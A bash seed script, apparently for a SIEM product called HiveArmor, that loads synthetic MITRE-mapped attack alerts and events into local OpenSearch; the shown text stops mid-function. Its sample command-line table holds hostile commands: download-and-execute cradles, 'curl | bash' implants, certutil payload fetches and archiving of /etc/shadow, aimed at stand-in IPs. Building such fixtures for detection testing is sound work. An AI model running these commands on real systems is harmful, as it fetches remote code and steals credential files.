#!/usr/bin/env bash
# =============================================================================
# HiveArmor — Seed 50 investigation-ready alerts with linked events
# =============================================================================
# Seeds alerts across 3 tenants (CWM: 20, Workmates1: 15, Workmates2: 15)
# Each alert has 5-20 linked events with proper ECS fields and MITRE mappings.
# Events are stored in v3-hive-log-* indices referenced by alert.id and
# correlation.id fields.
#
# Usage:
#   cd local-dev && bash seed-investigation-alerts.sh
#
# Prerequisites:
#   - OpenSearch running on https://localhost:9200
#   - Backend API running on http://localhost:8088 (for verification)
#   - Credentials: admin / LocalDev@2024! (OpenSearch)
#   - Credentials: admin / localdev123! (Backend API)
# =============================================================================

set -euo pipefail

# ─── Configuration ───────────────────────────────────────────────────────────

# OpenSearch direct access (for indexing)
OS_URL="https://localhost:9200"
OS_USER="admin"
OS_PASS='LocalDev@2024!'
CURL_OS="curl -sk -u ${OS_USER}:${OS_PASS}"

# Backend API (for verification)
BACKEND_URL="http://localhost:8088"
BACKEND_API="${BACKEND_URL}/api"

# Common curl defaults
CONTENT_TYPE="Content-Type: application/json"
CONTENT_TYPE_NDJSON="Content-Type: application/x-ndjson"

# Date helpers
TODAY=$(date -u +%Y.%m.%d)
NOW_EPOCH=$(date -u +%s)
INGEST_TS=$(date -u +%Y-%m-%dT%H:%M:%S.000Z)

# ─── Color Output Helpers ────────────────────────────────────────────────────

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No color

info()    { echo -e "${CYAN}[INFO]${NC} $*"; }
success() { echo -e "${GREEN}[OK]${NC}   $*"; }
warn()    { echo -e "${YELLOW}[WARN]${NC} $*"; }
fail()    { echo -e "${RED}[FAIL]${NC} $*"; }

# ─── Utility Functions ───────────────────────────────────────────────────────

# Generate ISO timestamp offset by N seconds from now
gen_ts() {
  local offset=$1
  date -u -r $(( NOW_EPOCH - offset )) +%Y-%m-%dT%H:%M:%S.000Z 2>/dev/null || \
  date -u -d "@$(( NOW_EPOCH - offset ))" +%Y-%m-%dT%H:%M:%S.000Z
}

# Bulk insert helper — sends NDJSON to OpenSearch _bulk API
bulk_insert() {
  local payload="$1"
  echo "$payload" | ${CURL_OS} -X POST "${OS_URL}/_bulk" \
    -H "${CONTENT_TYPE_NDJSON}" \
    --data-binary @- 2>/dev/null | python3 -c "
import sys, json
try:
    r = json.load(sys.stdin)
    items = r.get('items', [])
    errors = r.get('errors', False)
    if errors:
        err_count = sum(1 for i in items if 'error' in i.get('index', {}))
        print(f'  Indexed {len(items)} docs ({err_count} errors)')
    else:
        print(f'  Indexed {len(items)} docs')
except:
    print('  Bulk insert completed')
"
}

# Authenticate against backend API to get JWT (for verification steps)
get_backend_token() {
  local response
  response=$(curl -s --max-time 10 -X POST "${BACKEND_API}/authenticate" \
    -H "${CONTENT_TYPE}" \
    -d '{"username":"admin","password":"localdev123!","rememberMe":false}' 2>/dev/null || echo "")

  if [ -z "$response" ]; then
    warn "Backend API not reachable at ${BACKEND_URL} — skipping API verification"
    echo ""
    return
  fi

  local token
  token=$(echo "$response" | python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))" 2>/dev/null || echo "")

  if [ -z "$token" ]; then
    warn "Could not authenticate against backend API — skipping API verification"
    echo ""
    return
  fi

  echo "$token"
}

# ─── Attack Scenario Templates ───────────────────────────────────────────────
# Each scenario defines a realistic attack chain with MITRE ATT&CK mappings.
# Format: JSON-like heredoc per scenario capturing:
#   - id: short kebab-case identifier
#   - name: human-readable scenario name
#   - severity: critical|high|medium|low
#   - rule_name: detection rule that fires
#   - alert_title_template: template for generated alert titles
#   - stages[]: ordered MITRE tactic progression, each with:
#       tactic_id, tactic_name, technique_id, technique_name

# Scenario 1: Phishing → Execution → Persistence
read -r -d '' SCENARIO_1 << 'EOF' || true
{
  "id": "phishing-exec-persist",
  "name": "Spearphishing to PowerShell Persistence",
  "severity": "high",
  "rule_name": "Phishing Attachment Leading to Encoded PowerShell and Registry Persistence",
  "alert_title_template": "Spearphishing attachment opened followed by PowerShell execution and registry run key persistence on {host}",
  "stages": [
    {
      "tactic_id": "TA0001",
      "tactic_name": "Initial Access",
      "technique_id": "T1566.001",
      "technique_name": "Spearphishing Attachment"
    },
    {
      "tactic_id": "TA0002",
      "tactic_name": "Execution",
      "technique_id": "T1059.001",
      "technique_name": "PowerShell"
    },
    {
      "tactic_id": "TA0003",
      "tactic_name": "Persistence",
      "technique_id": "T1547.001",
      "technique_name": "Registry Run Keys / Startup Folder"
    }
  ]
}
EOF

# Scenario 2: Brute-Force → Lateral Movement
read -r -d '' SCENARIO_2 << 'EOF' || true
{
  "id": "bruteforce-lateral",
  "name": "Brute-Force Credential Access to Lateral Movement",
  "severity": "high",
  "rule_name": "Multiple Failed Logins Followed by RDP Lateral Movement",
  "alert_title_template": "Brute-force password guessing detected followed by RDP lateral movement from {host}",
  "stages": [
    {
      "tactic_id": "TA0006",
      "tactic_name": "Credential Access",
      "technique_id": "T1110.001",
      "technique_name": "Password Guessing"
    },
    {
      "tactic_id": "TA0008",
      "tactic_name": "Lateral Movement",
      "technique_id": "T1021.001",
      "technique_name": "Remote Desktop Protocol"
    }
  ]
}
EOF

# Scenario 3: Malware → C2 → Exfiltration
read -r -d '' SCENARIO_3 << 'EOF' || true
{
  "id": "malware-c2-exfil",
  "name": "Malware Delivery with C2 and Data Exfiltration",
  "severity": "critical",
  "rule_name": "Ingress Tool Transfer Followed by C2 Beacon and Data Exfiltration",
  "alert_title_template": "Malware ingress tool transfer detected with C2 communication and data exfiltration on {host}",
  "stages": [
    {
      "tactic_id": "TA0002",
      "tactic_name": "Execution",
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer"
    },
    {
      "tactic_id": "TA0011",
      "tactic_name": "Command and Control",
      "technique_id": "T1071.001",
      "technique_name": "Web Protocols"
    },
    {
      "tactic_id": "TA0010",
      "tactic_name": "Exfiltration",
      "technique_id": "T1041",
      "technique_name": "Exfiltration Over C2 Channel"
    }
  ]
}
EOF

# Scenario 4: Exploit → Execution → Defense Evasion
read -r -d '' SCENARIO_4 << 'EOF' || true
{
  "id": "exploit-exec-evasion",
  "name": "Public Application Exploit to Defense Evasion",
  "severity": "critical",
  "rule_name": "Exploit of Public-Facing Application Followed by Service Execution and Security Tool Disablement",
  "alert_title_template": "Exploitation of public application followed by service execution and security tool disablement on {host}",
  "stages": [
    {
      "tactic_id": "TA0001",
      "tactic_name": "Initial Access",
      "technique_id": "T1190",
      "technique_name": "Exploit Public-Facing Application"
    },
    {
      "tactic_id": "TA0002",
      "tactic_name": "Execution",
      "technique_id": "T1569.002",
      "technique_name": "Service Execution"
    },
    {
      "tactic_id": "TA0005",
      "tactic_name": "Defense Evasion",
      "technique_id": "T1562.001",
      "technique_name": "Disable or Modify Tools"
    }
  ]
}
EOF

# Scenario 5: Phishing → Execution → Credential Access
read -r -d '' SCENARIO_5 << 'EOF' || true
{
  "id": "phishing-exec-creds",
  "name": "Spearphishing Link to Credential Dumping",
  "severity": "critical",
  "rule_name": "Spearphishing Link Click Leading to Command Shell and LSASS Memory Dump",
  "alert_title_template": "Spearphishing link opened leading to command shell execution and LSASS credential dump on {host}",
  "stages": [
    {
      "tactic_id": "TA0001",
      "tactic_name": "Initial Access",
      "technique_id": "T1566.002",
      "technique_name": "Spearphishing Link"
    },
    {
      "tactic_id": "TA0002",
      "tactic_name": "Execution",
      "technique_id": "T1059.003",
      "technique_name": "Windows Command Shell"
    },
    {
      "tactic_id": "TA0006",
      "tactic_name": "Credential Access",
      "technique_id": "T1003.001",
      "technique_name": "LSASS Memory"
    }
  ]
}
EOF

# Scenario 6: Initial Access → Persistence → Privilege Escalation
read -r -d '' SCENARIO_6 << 'EOF' || true
{
  "id": "access-persist-privesc",
  "name": "Domain Account Access to Privilege Escalation",
  "severity": "high",
  "rule_name": "Compromised Domain Account with Scheduled Task Persistence and Windows Service Privilege Escalation",
  "alert_title_template": "Compromised domain account used to establish scheduled task persistence and escalate via Windows service on {host}",
  "stages": [
    {
      "tactic_id": "TA0001",
      "tactic_name": "Initial Access",
      "technique_id": "T1078.002",
      "technique_name": "Domain Accounts"
    },
    {
      "tactic_id": "TA0003",
      "tactic_name": "Persistence",
      "technique_id": "T1053.005",
      "technique_name": "Scheduled Task"
    },
    {
      "tactic_id": "TA0004",
      "tactic_name": "Privilege Escalation",
      "technique_id": "T1543.003",
      "technique_name": "Windows Service"
    }
  ]
}
EOF

# Scenario 7: Execution → Discovery → Collection
read -r -d '' SCENARIO_7 << 'EOF' || true
{
  "id": "exec-discovery-collect",
  "name": "PowerShell Reconnaissance and Data Staging",
  "severity": "medium",
  "rule_name": "PowerShell Execution Followed by Network Service Scanning and Data Staging",
  "alert_title_template": "PowerShell used for network service discovery and data staging on {host}",
  "stages": [
    {
      "tactic_id": "TA0002",
      "tactic_name": "Execution",
      "technique_id": "T1059.001",
      "technique_name": "PowerShell"
    },
    {
      "tactic_id": "TA0007",
      "tactic_name": "Discovery",
      "technique_id": "T1046",
      "technique_name": "Network Service Discovery"
    },
    {
      "tactic_id": "TA0009",
      "tactic_name": "Collection",
      "technique_id": "T1074.001",
      "technique_name": "Local Data Staging"
    }
  ]
}
EOF

# Scenario 8: Defense Evasion → Lateral Movement → Impact
read -r -d '' SCENARIO_8 << 'EOF' || true
{
  "id": "evasion-lateral-impact",
  "name": "Defense Evasion to Ransomware Impact",
  "severity": "critical",
  "rule_name": "Rundll32 Defense Evasion Followed by SMB Lateral Movement and Data Encryption for Impact",
  "alert_title_template": "Rundll32 evasion technique followed by SMB lateral movement and ransomware encryption on {host}",
  "stages": [
    {
      "tactic_id": "TA0005",
      "tactic_name": "Defense Evasion",
      "technique_id": "T1218.011",
      "technique_name": "Rundll32"
    },
    {
      "tactic_id": "TA0008",
      "tactic_name": "Lateral Movement",
      "technique_id": "T1021.002",
      "technique_name": "SMB/Windows Admin Shares"
    },
    {
      "tactic_id": "TA0040",
      "tactic_name": "Impact",
      "technique_id": "T1486",
      "technique_name": "Data Encrypted for Impact"
    }
  ]
}
EOF

# Scenario 9: Initial Access → Execution → C2
read -r -d '' SCENARIO_9 << 'EOF' || true
{
  "id": "access-exec-c2",
  "name": "Spearphishing Attachment to DLL Injection C2",
  "severity": "high",
  "rule_name": "Spearphishing Attachment Leading to DLL Injection and Web Protocol C2 Channel",
  "alert_title_template": "Spearphishing attachment leading to DLL injection and C2 channel establishment on {host}",
  "stages": [
    {
      "tactic_id": "TA0001",
      "tactic_name": "Initial Access",
      "technique_id": "T1566.001",
      "technique_name": "Spearphishing Attachment"
    },
    {
      "tactic_id": "TA0002",
      "tactic_name": "Execution",
      "technique_id": "T1055.001",
      "technique_name": "Dynamic-link Library Injection"
    },
    {
      "tactic_id": "TA0011",
      "tactic_name": "Command and Control",
      "technique_id": "T1071.001",
      "technique_name": "Web Protocols"
    }
  ]
}
EOF

# Scenario 10: Credential Access → Lateral Movement → Exfiltration
read -r -d '' SCENARIO_10 << 'EOF' || true
{
  "id": "creds-lateral-exfil",
  "name": "Credential Theft to Unencrypted Data Exfiltration",
  "severity": "high",
  "rule_name": "Password Guessing Attack Followed by RDP Access and Exfiltration Over Unencrypted Protocol",
  "alert_title_template": "Password guessing followed by RDP lateral movement and unencrypted data exfiltration from {host}",
  "stages": [
    {
      "tactic_id": "TA0006",
      "tactic_name": "Credential Access",
      "technique_id": "T1110.001",
      "technique_name": "Password Guessing"
    },
    {
      "tactic_id": "TA0008",
      "tactic_name": "Lateral Movement",
      "technique_id": "T1021.001",
      "technique_name": "Remote Desktop Protocol"
    },
    {
      "tactic_id": "TA0010",
      "tactic_name": "Exfiltration",
      "technique_id": "T1048.003",
      "technique_name": "Exfiltration Over Unencrypted Non-C2 Protocol"
    }
  ]
}
EOF

# ─── Scenario Registry ───────────────────────────────────────────────────────
# Array of all scenario variable names for iteration during alert generation

SCENARIOS=(
  "SCENARIO_1"
  "SCENARIO_2"
  "SCENARIO_3"
  "SCENARIO_4"
  "SCENARIO_5"
  "SCENARIO_6"
  "SCENARIO_7"
  "SCENARIO_8"
  "SCENARIO_9"
  "SCENARIO_10"
)

SCENARIO_COUNT=${#SCENARIOS[@]}
info "Loaded ${SCENARIO_COUNT} attack scenario templates"

# Helper: extract a field from a scenario JSON string
# Usage: scenario_field "$SCENARIO_1" ".id"
scenario_field() {
  local json="$1"
  local field="$2"
  echo "$json" | python3 -c "
import sys, json
data = json.load(sys.stdin)
keys = '${field}'.lstrip('.').split('.')
val = data
for k in keys:
    if k.isdigit():
        val = val[int(k)]
    else:
        val = val[k]
if isinstance(val, (dict, list)):
    print(json.dumps(val))
else:
    print(val)
" 2>/dev/null
}

# Helper: get the number of stages in a scenario
# Usage: scenario_stage_count "$SCENARIO_1"
scenario_stage_count() {
  local json="$1"
  echo "$json" | python3 -c "
import sys, json
data = json.load(sys.stdin)
print(len(data['stages']))
" 2>/dev/null
}

# Helper: get a stage field from a scenario
# Usage: scenario_stage_field "$SCENARIO_1" 0 "tactic_id"
scenario_stage_field() {
  local json="$1"
  local stage_idx="$2"
  local field="$3"
  echo "$json" | python3 -c "
import sys, json
data = json.load(sys.stdin)
stage = data['stages'][${stage_idx}]
print(stage['${field}'])
" 2>/dev/null
}

# ─── Main ────────────────────────────────────────────────────────────────────

echo ""
echo "═══════════════════════════════════════════════════════════════════════════"
echo "  HiveArmor — Seed Investigation-Ready Alerts"
echo "  50 alerts × 5-20 events each across 3 tenants"
echo "═══════════════════════════════════════════════════════════════════════════"
echo ""
info "OpenSearch: ${OS_URL}"
info "Backend:    ${BACKEND_URL}"
info "Date:       ${TODAY}"
echo ""

# ─── Task 1.16: Cleanup Old Seed Data ────────────────────────────────────────

info "Cleaning up old investigation seed data..."

# Delete old alerts matching INV-* pattern
${CURL_OS} -X POST "${OS_URL}/v3-hive-alert-*/_delete_by_query" \
  -H "${CONTENT_TYPE}" \
  -d '{"query":{"wildcard":{"id.keyword":{"value":"INV-*"}}}}' 2>/dev/null | \
  python3 -c "
import sys, json
try:
    r = json.load(sys.stdin)
    print(f'  Deleted {r.get(\"deleted\", 0)} old alert docs')
except:
    print('  Alert cleanup completed')
" || true

# Delete old events referencing INV-* alerts
${CURL_OS} -X POST "${OS_URL}/v3-hive-log-*/_delete_by_query" \
  -H "${CONTENT_TYPE}" \
  -d '{"query":{"wildcard":{"alert.id.keyword":{"value":"INV-*"}}}}' 2>/dev/null | \
  python3 -c "
import sys, json
try:
    r = json.load(sys.stdin)
    print(f'  Deleted {r.get(\"deleted\", 0)} old event docs')
except:
    print('  Event cleanup completed')
" || true

success "Old seed data cleaned"
echo ""

# ─── Tasks 1.3-1.15: Generate Alerts and Events via Python ────────────────────
# Comprehensive Python script generates all alert + event NDJSON payloads
# for 3 tenants: CWM (20 alerts), Workmates1 (15), Workmates2 (15)

info "Generating investigation-ready alerts and linked events..."

ALERT_NDJSON_FILE=$(mktemp /tmp/ha_seed_XXXXXX)

python3 << 'PYEOF' > "$ALERT_NDJSON_FILE"
import json, random, hashlib, sys
from datetime import datetime, timedelta, timezone

random.seed(42)  # Reproducible seed data

NOW = datetime.now(timezone.utc)
TODAY_STR = NOW.strftime("%Y.%m.%d")

# ─── Task 1.10: Realistic hostnames
HOSTNAMES = [
    "FIN-WKS-044", "DC-PROD-01", "HR-LPT-012", "ENG-SRV-08",
    "SEC-MON-02", "MKT-DSK-019", "DEV-WKS-007", "OPS-NAS-03"
]

# ─── Task 1.11: Realistic usernames
USERNAMES = [
    "sarah.chen", "james.wilson", "admin-svc-01", "priya.sharma",
    "carlos.mendez", "backup-agent", "svc-monitor"
]

# ─── Task 1.12: Realistic IPs
INTERNAL_IPS = ["10.1.5.44", "10.2.8.12", "10.3.1.100", "172.16.4.55"]
EXTERNAL_IPS = ["203.0.113.45", "198.51.100.22", "203.0.113.88", "198.51.100.177"]

# ─── Task 1.13: Realistic process names
PROCESS_NAMES = [
    "powershell.exe", "cmd.exe", "WINWORD.EXE", "outlook.exe",
    "rundll32.exe", "python3", "bash", "svchost.exe",
    "certutil.exe", "mshta.exe"
]

# Tags pool (Task 1.15)
TAGS_POOL = [
    "phishing", "powershell", "lateral-movement", "credential-access",
    "ransomware", "data-exfil", "c2-beacon", "persistence",
    "brute-force", "defense-evasion", "insider-threat", "high-priority",
    "escalated", "initial-access"
]

# Note authors and bodies
NOTE_AUTHORS = ["maya.chen", "alex.rivera", "jordan.smith", "admin-svc-01"]
NOTE_BODIES = [
    "Confirmed macro execution from phishing email. Checking lateral movement.",
    "Initial triage complete — escalating to Tier 2 for deeper analysis.",
    "Network indicators match known APT infrastructure. Blocking at firewall.",
    "False positive ruled out — behavior is consistent with genuine compromise.",
    "Correlating with SIEM events from the same time window on adjacent hosts.",
    "Containment action taken: host isolated from network pending investigation.",
    "Validated file hash against VirusTotal — 45/72 detections confirmed malicious.",
    "Reviewing process tree for evidence of privilege escalation attempts."
]

# Status actors
STATUS_ACTORS = ["maya.chen", "alex.rivera", "system", "jordan.smith"]

# Scenarios (matching SCENARIO_1 through SCENARIO_10 from shell)
SCENARIOS = [
    {
        "id": "phishing-exec-persist",
        "name": "Spearphishing to PowerShell Persistence",
        "severity": "high",
        "rule_name": "Phishing Attachment Leading to Encoded PowerShell and Registry Persistence",
        "alert_title_template": "Spearphishing attachment opened followed by PowerShell execution and registry run key persistence on {host}",
        "stages": [
            {"tactic_id": "TA0001", "tactic_name": "Initial Access", "technique_id": "T1566.001", "technique_name": "Spearphishing Attachment"},
            {"tactic_id": "TA0002", "tactic_name": "Execution", "technique_id": "T1059.001", "technique_name": "PowerShell"},
            {"tactic_id": "TA0003", "tactic_name": "Persistence", "technique_id": "T1547.001", "technique_name": "Registry Run Keys / Startup Folder"}
        ]
    },
    {
        "id": "bruteforce-lateral",
        "name": "Brute-Force Credential Access to Lateral Movement",
        "severity": "high",
        "rule_name": "Multiple Failed Logins Followed by RDP Lateral Movement",
        "alert_title_template": "Brute-force password guessing detected followed by RDP lateral movement from {host}",
        "stages": [
            {"tactic_id": "TA0006", "tactic_name": "Credential Access", "technique_id": "T1110.001", "technique_name": "Password Guessing"},
            {"tactic_id": "TA0008", "tactic_name": "Lateral Movement", "technique_id": "T1021.001", "technique_name": "Remote Desktop Protocol"}
        ]
    },
    {
        "id": "malware-c2-exfil",
        "name": "Malware Delivery with C2 and Data Exfiltration",
        "severity": "critical",
        "rule_name": "Ingress Tool Transfer Followed by C2 Beacon and Data Exfiltration",
        "alert_title_template": "Malware ingress tool transfer detected with C2 communication and data exfiltration on {host}",
        "stages": [
            {"tactic_id": "TA0002", "tactic_name": "Execution", "technique_id": "T1105", "technique_name": "Ingress Tool Transfer"},
            {"tactic_id": "TA0011", "tactic_name": "Command and Control", "technique_id": "T1071.001", "technique_name": "Web Protocols"},
            {"tactic_id": "TA0010", "tactic_name": "Exfiltration", "technique_id": "T1041", "technique_name": "Exfiltration Over C2 Channel"}
        ]
    },
    {
        "id": "exploit-exec-evasion",
        "name": "Public Application Exploit to Defense Evasion",
        "severity": "critical",
        "rule_name": "Exploit of Public-Facing Application Followed by Service Execution and Security Tool Disablement",
        "alert_title_template": "Exploitation of public application followed by service execution and security tool disablement on {host}",
        "stages": [
            {"tactic_id": "TA0001", "tactic_name": "Initial Access", "technique_id": "T1190", "technique_name": "Exploit Public-Facing Application"},
            {"tactic_id": "TA0002", "tactic_name": "Execution", "technique_id": "T1569.002", "technique_name": "Service Execution"},
            {"tactic_id": "TA0005", "tactic_name": "Defense Evasion", "technique_id": "T1562.001", "technique_name": "Disable or Modify Tools"}
        ]
    },
    {
        "id": "phishing-exec-creds",
        "name": "Spearphishing Link to Credential Dumping",
        "severity": "critical",
        "rule_name": "Spearphishing Link Click Leading to Command Shell and LSASS Memory Dump",
        "alert_title_template": "Spearphishing link opened leading to command shell execution and LSASS credential dump on {host}",
        "stages": [
            {"tactic_id": "TA0001", "tactic_name": "Initial Access", "technique_id": "T1566.002", "technique_name": "Spearphishing Link"},
            {"tactic_id": "TA0002", "tactic_name": "Execution", "technique_id": "T1059.003", "technique_name": "Windows Command Shell"},
            {"tactic_id": "TA0006", "tactic_name": "Credential Access", "technique_id": "T1003.001", "technique_name": "LSASS Memory"}
        ]
    },
    {
        "id": "access-persist-privesc",
        "name": "Domain Account Access to Privilege Escalation",
        "severity": "high",
        "rule_name": "Compromised Domain Account with Scheduled Task Persistence and Windows Service Privilege Escalation",
        "alert_title_template": "Compromised domain account used to establish scheduled task persistence and escalate via Windows service on {host}",
        "stages": [
            {"tactic_id": "TA0001", "tactic_name": "Initial Access", "technique_id": "T1078.002", "technique_name": "Domain Accounts"},
            {"tactic_id": "TA0003", "tactic_name": "Persistence", "technique_id": "T1053.005", "technique_name": "Scheduled Task"},
            {"tactic_id": "TA0004", "tactic_name": "Privilege Escalation", "technique_id": "T1543.003", "technique_name": "Windows Service"}
        ]
    },
    {
        "id": "exec-discovery-collect",
        "name": "PowerShell Reconnaissance and Data Staging",
        "severity": "medium",
        "rule_name": "PowerShell Execution Followed by Network Service Scanning and Data Staging",
        "alert_title_template": "PowerShell used for network service discovery and data staging on {host}",
        "stages": [
            {"tactic_id": "TA0002", "tactic_name": "Execution", "technique_id": "T1059.001", "technique_name": "PowerShell"},
            {"tactic_id": "TA0007", "tactic_name": "Discovery", "technique_id": "T1046", "technique_name": "Network Service Discovery"},
            {"tactic_id": "TA0009", "tactic_name": "Collection", "technique_id": "T1074.001", "technique_name": "Local Data Staging"}
        ]
    },
    {
        "id": "evasion-lateral-impact",
        "name": "Defense Evasion to Ransomware Impact",
        "severity": "critical",
        "rule_name": "Rundll32 Defense Evasion Followed by SMB Lateral Movement and Data Encryption for Impact",
        "alert_title_template": "Rundll32 evasion technique followed by SMB lateral movement and ransomware encryption on {host}",
        "stages": [
            {"tactic_id": "TA0005", "tactic_name": "Defense Evasion", "technique_id": "T1218.011", "technique_name": "Rundll32"},
            {"tactic_id": "TA0008", "tactic_name": "Lateral Movement", "technique_id": "T1021.002", "technique_name": "SMB/Windows Admin Shares"},
            {"tactic_id": "TA0040", "tactic_name": "Impact", "technique_id": "T1486", "technique_name": "Data Encrypted for Impact"}
        ]
    },
    {
        "id": "access-exec-c2",
        "name": "Spearphishing Attachment to DLL Injection C2",
        "severity": "high",
        "rule_name": "Spearphishing Attachment Leading to DLL Injection and Web Protocol C2 Channel",
        "alert_title_template": "Spearphishing attachment leading to DLL injection and C2 channel establishment on {host}",
        "stages": [
            {"tactic_id": "TA0001", "tactic_name": "Initial Access", "technique_id": "T1566.001", "technique_name": "Spearphishing Attachment"},
            {"tactic_id": "TA0002", "tactic_name": "Execution", "technique_id": "T1055.001", "technique_name": "Dynamic-link Library Injection"},
            {"tactic_id": "TA0011", "tactic_name": "Command and Control", "technique_id": "T1071.001", "technique_name": "Web Protocols"}
        ]
    },
    {
        "id": "creds-lateral-exfil",
        "name": "Credential Theft to Unencrypted Data Exfiltration",
        "severity": "high",
        "rule_name": "Password Guessing Attack Followed by RDP Access and Exfiltration Over Unencrypted Protocol",
        "alert_title_template": "Password guessing followed by RDP lateral movement and unencrypted data exfiltration from {host}",
        "stages": [
            {"tactic_id": "TA0006", "tactic_name": "Credential Access", "technique_id": "T1110.001", "technique_name": "Password Guessing"},
            {"tactic_id": "TA0008", "tactic_name": "Lateral Movement", "technique_id": "T1021.001", "technique_name": "Remote Desktop Protocol"},
            {"tactic_id": "TA0010", "tactic_name": "Exfiltration", "technique_id": "T1048.003", "technique_name": "Exfiltration Over Unencrypted Non-C2 Protocol"}
        ]
    }
]

# ─── Tenant Configuration (Tasks 1.3, 1.4, 1.5) ────────────────────────────
TENANTS = [
    {"id": 3813, "prefix": "cwm", "label": "CWM", "chained_scenarios": 4, "standalone": 4},
    {"id": 3812, "prefix": "wm1", "label": "Workmates1", "chained_scenarios": 3, "standalone": 3},
    {"id": 3814, "prefix": "wm2", "label": "Workmates2", "chained_scenarios": 3, "standalone": 3}
]

# Severity mapping
SEVERITY_MAP = {"critical": 4, "high": 3, "medium": 2, "low": 1}
SEVERITY_LABEL_MAP = {4: "critical", 3: "high", 2: "medium", 1: "low"}

# ECS event actions per tactic
EVENT_ACTIONS = {
    "TA0001": ["file_opened", "email_received", "connection_attempted", "document_opened"],
    "TA0002": ["process_created", "script_executed", "dll_loaded", "service_started"],
    "TA0003": ["registry_modified", "scheduled_task_created", "service_installed", "startup_item_added"],
    "TA0004": ["token_manipulated", "service_modified", "process_created", "privilege_assigned"],
    "TA0005": ["file_renamed", "process_injected", "tool_disabled", "log_cleared"],
    "TA0006": ["authentication_failed", "credential_dumped", "memory_accessed", "hash_extracted"],
    "TA0007": ["network_scanned", "service_enumerated", "account_queried", "share_listed"],
    "TA0008": ["rdp_connected", "smb_session_created", "wmi_executed", "psexec_used"],
    "TA0009": ["file_copied", "data_staged", "clipboard_captured", "keylog_started"],
    "TA0010": ["data_transferred", "archive_created", "upload_detected", "exfil_connection"],
    "TA0011": ["dns_query", "http_beacon", "encrypted_channel", "proxy_connection"],
    "TA0040": ["file_encrypted", "service_stopped", "data_destroyed", "ransom_note_created"]
}

# ECS event categories per tactic
EVENT_CATEGORIES = {
    "TA0001": [["file"], ["email"], ["network"]],
    "TA0002": [["process"], ["process"], ["library"]],
    "TA0003": [["registry"], ["configuration"], ["process"]],
    "TA0004": [["process"], ["configuration"], ["iam"]],
    "TA0005": [["file"], ["process"], ["configuration"]],
    "TA0006": [["authentication"], ["process"], ["file"]],
    "TA0007": [["network"], ["process"], ["network"]],
    "TA0008": [["network"], ["session"], ["process"]],
    "TA0009": [["file"], ["file"], ["process"]],
    "TA0010": [["network"], ["file"], ["network"]],
    "TA0011": [["network"], ["network"], ["network"]],
    "TA0040": [["file"], ["process"], ["file"]]
}

# File paths for events
FILE_PATHS = [
    "C:\\Windows\\System32\\cmd.exe",
    "C:\\Users\\sarah.chen\\Downloads\\invoice-Q3.docm",
    "C:\\Windows\\Temp\\payload.dll",
    "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updater.exe",
    "/tmp/.hidden/collector.py",
    "C:\\Windows\\System32\\svchost.exe",
    "C:\\Users\\Public\\Documents\\stage.zip",
    "C:\\Windows\\System32\\lsass.exe",
    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "C:\\Windows\\System32\\rundll32.exe"
]

# Command lines per process
COMMAND_LINES = {
    "powershell.exe": [
        "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
        "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.45/s.ps1')",
        "powershell.exe Get-Process | Where-Object {$_.CPU -gt 50}"
    ],
    "cmd.exe": [
        "cmd.exe /c whoami /all > C:\\Windows\\Temp\\info.txt",
        "cmd.exe /c net user /domain",
        "cmd.exe /c schtasks /create /tn Update /tr C:\\Windows\\Temp\\svc.exe /sc onlogon"
    ],
    "WINWORD.EXE": [
        "\"C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\sarah.chen\\Downloads\\invoice-Q3.docm\"",
        "\"C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\priya.sharma\\Downloads\\report.docm\""
    ],
    "outlook.exe": [
        "\"C:\\Program Files\\Microsoft Office\\Office16\\OUTLOOK.EXE\"",
        "\"C:\\Program Files\\Microsoft Office\\Office16\\OUTLOOK.EXE\" /recycle"
    ],
    "rundll32.exe": [
        "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write()",
        "rundll32.exe C:\\Windows\\Temp\\payload.dll,DllMain"
    ],
    "python3": [
        "python3 /tmp/.hidden/collector.py --exfil --target 198.51.100.22",
        "python3 -c \"import socket; s=socket.socket(); s.connect(('203.0.113.88',443))\""
    ],
    "bash": [
        "/bin/bash -c 'curl -s http://203.0.113.45/implant | bash'",
        "/bin/bash -c 'tar czf /tmp/data.tar.gz /etc/shadow /etc/passwd'"
    ],
    "svchost.exe": [
        "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
        "C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted"
    ],
    "certutil.exe": [
        "certutil.exe -urlcache -split -f http://203.0.113.88/payload.exe C:\\Windows\\Temp\\update.exe",
        "certutil.exe -encode C:\\Windows\\Temp\\data.zip C:\\Windows\\Temp\\data.b64"
    ],
    "mshta.exe": [
        "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -ep bypass\"\"\")",
        "mshta.exe http://203.0.113.45/payload.hta"
    ]
}

def gen_sha256():
    """Generate a realistic-looking SHA256 hash."""
    return hashlib.sha256(str(random.random()).encode()).hexdigest()

def gen_timestamp(base_time, offset_minutes_min=0, offset_minutes_max=30):
    """Generate a timestamp within a window from base_time."""
    offset = timedelta(minutes=random.uniform(offset_minutes_min, offset_minutes_max))
    ts = base_time + offset
    return ts.strftime("%Y-%m-%dT%H:%M:%S.") + f"{random.randint(0,999):03d}Z"

def gen_status_history(alert_ts_str):
    """Task 1.15: Generate statusHistory with creation + 0-2 transitions."""
    history = []
    num_transitions = random.randint(0, 2)
    current_status = 1  # New
    status_flow = [3, 5, 7]  # Acknowledged, Investigating, Resolved
    ts = datetime.strptime(alert_ts_str, "%Y-%m-%dT%H:%M:%S.%fZ").replace(tzinfo=timezone.utc)
    for i in range(num_transitions):
        next_status = status_flow[i] if i < len(status_flow) else 7
        ts = ts + timedelta(minutes=random.randint(5, 120))
        history.append({
            "from": current_status,
            "to": next_status,
            "at": ts.strftime("%Y-%m-%dT%H:%M:%S.") + f"{random.randint(0,999):03d}Z",
